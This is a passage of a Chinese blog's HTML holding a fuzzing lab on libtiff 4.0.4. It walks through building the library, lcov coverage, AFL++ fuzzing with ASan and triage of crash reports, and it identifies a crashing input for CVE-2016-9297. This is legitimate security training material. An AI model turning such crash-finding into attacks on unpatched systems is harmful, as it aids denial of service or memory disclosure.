class="line">    close(socket_fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 bind 执行以后，当前目录会出现一个名为 “B”(CAN_SERVICE) 的文件</li>
<li>当 unlink(CAN_SERVICE) 执行以后，文件 “B” 消失</li>
<li>如果不及时调用 unlink 的话，会出现 <code>Address already in use</code> 报错</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/100151937">超详细的Socket通信原理和实例讲解 - 知乎</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/" class="post-title-link" itemprop="url">Fuzz Lab4-tiff-4.0.4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-17 16:32:29 / Modified: 16:34:25" itemprop="dateCreated datePublished" datetime="2022-08-17T16:32:29+08:00">2022-08-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab4：LibTIFF"><a href="#Fuzz-Lab4：LibTIFF" class="headerlink" title="Fuzz-Lab4：LibTIFF"></a>Fuzz-Lab4：LibTIFF</h2><p>这次我们将模糊 <strong>LibTIFF</strong> 图像库（读取和写入 tiff 文件最主要的一个开源库），目标是在 libtiff 4.0.4 中为 [<strong>CVE-2016-9297</strong>] 找到 crash/PoC，并 <strong>测量 crash/PoC 的代码覆盖率数据</strong></p>
<ul>
<li><strong>CVE-2016-9297</strong> 是一个越界读取漏洞，可以通过特制的 TIFF_SETGET_C16_ASCII 或 TIFF_SETGET_C32_ASCII 标记值触发<ul>
<li>越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞</li>
<li>结果，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息</li>
</ul>
</li>
</ul>
<p>完成本练习后，您将了解：</p>
<ul>
<li>如何使用 LCOV 测量代码覆盖率</li>
<li>如何使用代码覆盖率数据来提高模糊测试的有效性</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
<ul>
<li>Fuzz LibTiff（启用 ASan）直到出现一些独特的崩溃</li>
<li>对崩溃进行分类以找到漏洞的 PoC</li>
<li>测量这个 PoC 的代码覆盖率</li>
<li>修复问题</li>
</ul>
<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tiff &amp;&amp; cd fuzzing_tiff/</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz # 下载libtiff-4.0.4</span><br><span class="line">tar -xzvf tiff-4.0.4.tar.gz</span><br><span class="line"></span><br><span class="line">cd tiff-4.0.4/ # 构建和安装libtiff</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tiff/install2/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>作为目标二进制文件，我们可以对位于 <code>/bin</code> 文件夹中的 <code>tiffinfo</code> 二进制文件进行模糊测试，作为种子输入语料库，我们将使用 <code>/test/images/</code> 文件夹中的示例图像</p>
<p>要测试一切是否正常，只需键入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install2/bin/tiffinfo -D -j -c -r -s -w <span class="variable">$HOME</span>/tiff-4.0.4/<span class="built_in">test</span>/images/palette-1c-1b.tiff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在最后一个命令行中，您可以看到我启用了所有这些标志：“-j -c -r -s -w”，这是为了提高 <strong>代码覆盖率</strong> 并增加发现错误的机会</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: </span></span><br><span class="line"><span class="function">       0:     0     0     0</span></span><br><span class="line"><span class="function">       1: 65535 65535 65535</span></span><br><span class="line"><span class="function">  DocumentName: palette-1c-1b.tiff</span></span><br><span class="line"><span class="function">  Software: GraphicsMagick 1.2 unreleased Q16 http:<span class="comment">//www.GraphicsMagick.org/</span></span></span><br><span class="line"><span class="function">  1 Strips:</span></span><br><span class="line"><span class="function">      0: [       8,     3020]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>标签图像文件格式（Tag Image File Format，TIFF）是一种灵活的位图格式，主要用来存储包括照片和艺术图在内的图像</li>
<li>而 LibTIFF 就是打开 TIFF 文件的一种工具</li>
</ul>
<h2 id="Code-coverage"><a href="#Code-coverage" class="headerlink" title="Code coverage"></a>Code coverage</h2><p>代码覆盖率是一种软件指标，显示每行代码被触发的次数，通过使用代码覆盖率，我们将了解模糊器已到达代码的哪些部分并 <strong>可视化</strong> 模糊测试过程</p>
<p>首先，我们需要安装 lcov ，我们可以使用以下命令来完成：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lcov</span><br></pre></td></tr></table></figure>
<ul>
<li>lcov 是 gcc 测试覆盖率的前端图形展示工具</li>
</ul>
<p>现在我们需要使用 —coverage 标志（编译器和链接器）重建 libTIFF：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">make clean</span><br><span class="line">  </span><br><span class="line">CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>然后我们依次输入以下内容来收集代码覆盖率数据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">lcov --zerocounters --directory ./ # 重置以前的计数器</span><br><span class="line">lcov --capture --initial --directory ./ --output-file app.info # 返回“基线”覆盖率数据文件,其中包含每条检测线的零覆盖率</span><br><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="variable">$HOME</span>/tiff-4.0.4/<span class="built_in">test</span>/images/palette-1c-1b.tiff <span class="comment"># 运行您要分析的应用程序,您可以使用不同的输入多次运行它</span></span></span><br><span class="line">lcov --no-checksum --directory ./ --capture --output-file app2.info # 将当前覆盖状态保存到app2.info文件中</span><br></pre></td></tr></table></figure>
<p>最后，我们必须生成 HTML 输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info</span><br></pre></td></tr></table></figure>
<ul>
<li>如果一切顺利，代码覆盖率报告将在 html-coverage 文件夹中创建，只需打开 <code>./html-coverage/index.html</code> 文件，您应该会看到如下内容：</li>
</ul>
<img src="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/1660625470639.png" class width="1660625470639"> 
<ul>
<li>其实我并不知道这个东西有什么用</li>
</ul>
<h2 id="Fuzz-LibTIFF"><a href="#Fuzz-LibTIFF" class="headerlink" title="Fuzz LibTIFF"></a>Fuzz LibTIFF</h2><p>现在我们将在启用 ASAN 的情况下编译 libtiff</p>
<p>首先，我们要清理所有以前编译的目标文件和可执行文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_tiff/install</span><br><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
<p>现在，我们在调用 make 之前设置 AFL_USE_ASAN=1：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make -j4</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>
<p>现在，您可以使用以下命令运行模糊器：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/tiff-4.0.4/test/images/ -o $HOME/fuzzing_tiff/out/ -s 123 -- $HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<img src="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/1660626617061.png" class width="1660626617061"> 
<h2 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h2><p>接下来我们要使用 ASan 对崩溃进行分类</p>
<p>调试使用 ASan 构建的程序比前面的练习要容易得多，我们需要做的就是向程序提供崩溃文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w ./id:000000,sig:11,src:000009,time:67581,execs:76549,op:havoc,rep:4</span> </span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TIFFReadDirectory: Warning, Bogus <span class="string">&quot;StripByteCounts&quot;</span> field, ignoring <span class="keyword">and</span> calculating from imagelength.</span><br><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1537</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: </span></span><br><span class="line"><span class="function">AddressSanitizer:DEADLYSIGNAL</span></span><br><span class="line"><span class="function"></span>=================================================================</span><br><span class="line">==<span class="number">3472169</span>==ERROR: AddressSanitizer: SEGV on unknown address <span class="number">0x000000000000</span> (pc <span class="number">0x00000046e5f3</span> bp <span class="number">0x7ffdb4e2bf10</span> sp <span class="number">0x7ffdb4e2bd80</span> T0)</span><br><span class="line">==<span class="number">3472169</span>==The signal is caused by a READ memory access.</span><br><span class="line">==<span class="number">3472169</span>==Hint: address points to the zero page.</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x46e5f3</span> in TIFFPrintDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x33fbad</span> in tiffinfo /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">449</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x33f1d4</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">152</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x7f60e75b6082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x29165d</span> in _start (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x29165d</span>)</span><br><span class="line"></span><br><span class="line">AddressSanitizer can <span class="keyword">not</span> provide additional info.</span><br><span class="line">SUMMARY: AddressSanitizer: SEGV /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c in TIFFPrintDirectory</span><br><span class="line">==<span class="number">3472169</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>输出的上半截就是报错信息，下半截是执行跟踪</li>
<li>程序 crash 的原因是无效的地址 <code>0x000000000000</code></li>
</ul>
<p>除了这种 crash 以外，还有其他原因：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w ./id:000002,sig:06,src:000009,time:81829,execs:92343,op:havoc,rep:8</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">TIFFReadDirectoryCheckOrder: Warning, Invalid TIFF directory; tags are <span class="keyword">not</span> sorted in ascending order.</span><br><span class="line">TIFFReadDirectory: Warning, Unknown field with tag <span class="number">7217</span> (<span class="number">0x1c31</span>) encountered.</span><br><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: </span></span><br><span class="line"><span class="function">       0: 29281 26979 24935</span></span><br><span class="line"><span class="function">       1: 28776 29517 26979</span></span><br><span class="line"><span class="function">  DocumentName: palette-1c-1b.tiff</span></span><br><span class="line"><span class="function"></span>=================================================================</span><br><span class="line">==<span class="number">3582061</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x6070000000d1</span> at pc <span class="number">0x0000002aadf2</span> bp <span class="number">0x7ffc31f49e70</span> sp <span class="number">0x7ffc31f49630</span></span><br><span class="line">READ of size <span class="number">66</span> at <span class="number">0x6070000000d1</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x2aadf1</span> in <span class="built_in">fputs</span> (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x2aadf1</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x47068f</span> in _TIFFPrintField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">127</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x47068f</span> in TIFFPrintDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">641</span>:<span class="number">5</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x33fbad</span> in tiffinfo /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">449</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x33f1d4</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">152</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x7f68b28f1082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x29165d</span> in _start (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x29165d</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x6070000000d1</span> is located <span class="number">0</span> bytes to the right of <span class="number">65</span>-byte region [<span class="number">0x607000000090</span>,<span class="number">0x6070000000d1</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x30b6cd</span> in <span class="built_in">malloc</span> (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x30b6cd</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x3564d5</span> in _TIFFmalloc /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_unix.c:<span class="number">283</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x3564d5</span> in setByteArray /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">51</span>:<span class="number">19</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x3564d5</span> in _TIFFVSetField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">539</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x34c2d6</span> in TIFFVSetField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">820</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x34c2d6</span> in TIFFSetField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">764</span>:<span class="number">11</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x38464e</span> in TIFFFetchNormalTag /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dirread.c:<span class="number">5164</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x377976</span> in TIFFReadDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dirread.c:<span class="number">3810</span>:<span class="number">12</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x433bc9</span> in TIFFClientOpen /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_open.c:<span class="number">466</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x33ef47</span> in TIFFFdOpen /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_unix.c:<span class="number">178</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x33ef47</span> in TIFFOpen /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_unix.c:<span class="number">217</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x33ef47</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">140</span>:<span class="number">9</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x7f68b28f1082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x2aadf1</span>) in <span class="built_in">fputs</span></span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c0e7fff7fc0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff7fd0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff7fe0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff7ff0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff8000</span>: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c0e7fff8010</span>: fa fa <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[<span class="number">01</span>]fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8020</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8030</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8040</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8050</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8060</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">3582061</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>这种 crash 的原因就是堆溢出</li>
<li>目前只发现这两种类型的 crash</li>
</ul>
<p>经过对比发现：<strong>[CVE-2016-9297]</strong> 的 PoC 为 <code>id:000002</code>（通过精心编制的 TIFF_SETGET_C16ASCII 或 TIFF_SETGET_C32_ASCII 标记值来造成越界读取） </p>
<h2 id="PoC-Code-coverage"><a href="#PoC-Code-coverage" class="headerlink" title="PoC Code coverage"></a>PoC Code coverage</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">make clean</span><br><span class="line">  </span><br><span class="line">CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/coverage/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>然后我们依次输入以下内容来收集代码覆盖率数据：</p>
